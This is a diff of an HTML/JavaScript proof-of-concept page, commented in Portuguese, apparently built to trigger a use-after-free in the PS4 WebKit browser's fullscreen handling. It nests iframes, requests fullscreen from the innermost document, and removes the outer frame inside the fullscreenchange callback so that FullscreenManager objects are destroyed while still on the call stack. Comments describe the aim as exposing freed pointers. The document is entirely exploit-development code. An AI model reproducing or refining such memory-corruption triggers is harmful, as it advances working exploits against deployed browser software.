@@ -1,58 +1,68 @@
 <html>
 <body>
-<button id="run">Run V2.3</button>
+<button id="run">Run V2.4</button>
 <div id="status">Ready</div>
-<iframe id="testFrame" width="100" height="100"></iframe>
+<iframe id="outerFrame" width="200" height="200"></iframe>
 <script>
 /*
-  V2.3: Substitui iframe.remove() por iframe.src = 'about:blank'.
-  Teardown via navegação — FrameLoader destrói o Document de forma
-  diferente do remove(), pode expor ponteiro diferente.
-  iframe.onload é reatribuído para evitar loop.
+  Fix: não depende de innerFrame.onload (não dispara no PS4 para
+  iframes escritos via doc.write). O conteúdo do inner é escrito
+  sincronamente dentro do onclick, antes do webkitRequestFullscreen.
 */
-var iframe   = document.getElementById("testFrame");
-var popup    = null;
-var didSetup = false;
+var outerFrame = document.getElementById("outerFrame");
+var popup = null;
 
-iframe.onload = function() {
-    if (didSetup) return; // evita re-trigger no load do about:blank
-    didSetup = true;
-
-    var iDoc = iframe.contentDocument;
-    iDoc.open();
-    iDoc.write(
-        '<!DOCTYPE html><html><body>' +
-        '<div style="width:200px;height:150px;background:blue"></div>' +
-        '</body></html>'
-    );
-    iDoc.close();
-
-    iDoc.addEventListener('webkitfullscreenchange', function() {
-        document.getElementById("status").innerHTML = "child fullscreenchange";
-
-        // Navega em vez de remover — Document destruído, elemento permanece
-        iframe.src = "about:blank";
-        if (popup && !popup.closed) popup.close();
-
-        document.getElementById("status").innerHTML += " | navigated";
-    });
+// Apenas cria a estrutura outer+inner em branco no onload
+outerFrame.onload = function() {
+    var outerDoc = outerFrame.contentDocument;
+    if (!outerDoc || !outerDoc.body) return;
+    if (outerDoc.getElementById("inner")) return; // evita re-trigger
+    outerDoc.open();
+    outerDoc.write('<html><body>' +
+        '<iframe id="inner" width="150" height="150"></iframe>' +
+        '</body></html>');
+    outerDoc.close();
 };
 
 document.getElementById("run").onclick = function() {
+    var outerDoc   = outerFrame.contentDocument;
+    if (!outerDoc) { document.getElementById("status").innerHTML = "outerDoc null"; return; }
+
+    var innerFrame = outerDoc.getElementById("inner");
+    if (!innerFrame) { document.getElementById("status").innerHTML = "inner não encontrado"; return; }
+
+    // Escreve conteúdo do inner SINCRONAMENTE — sem depender de onload
+    var innerDoc = innerFrame.contentDocument;
+    innerDoc.open();
+    innerDoc.write('<html><body>' +
+        '<div style="width:150px;height:150px;background:red"></div>' +
+        '</body></html>');
+    innerDoc.close();
+
+    // Listener no NETO — remove o AVÔ de dentro do callback
+    // Dois níveis de FullscreenManager destruídos enquanto o do neto
+    // ainda está na call stack
+    innerDoc.addEventListener('webkitfullscreenchange', function() {
+        document.getElementById("status").innerHTML =
+            "INNER fullscreenchange — remove outerFrame (2 níveis)";
+        if (outerFrame && outerFrame.parentNode) outerFrame.remove();
+        if (popup && !popup.closed) popup.close();
+    });
+
     popup = window.open("", "_blank", "width=400,height=300");
+    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
     popup.document.open();
-    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
+    popup.document.write('<html><body><h3>Popup</h3></body></html>');
     popup.document.close();
 
-    var iDoc = iframe.contentDocument;
-    iDoc.documentElement.webkitRequestFullscreen();
+    // Fullscreen pedido pelo NETO
+    innerDoc.documentElement.webkitRequestFullscreen();
 
     setTimeout(function() {
         if (!popup || popup.closed) return;
         popup.focus();
         window.focus();
-        iframe.contentWindow.focus();
-
+        try { outerFrame.contentWindow.focus(); } catch(e) {}
         setTimeout(function() {
             if (popup && !popup.closed) popup.close();
         }, 300);
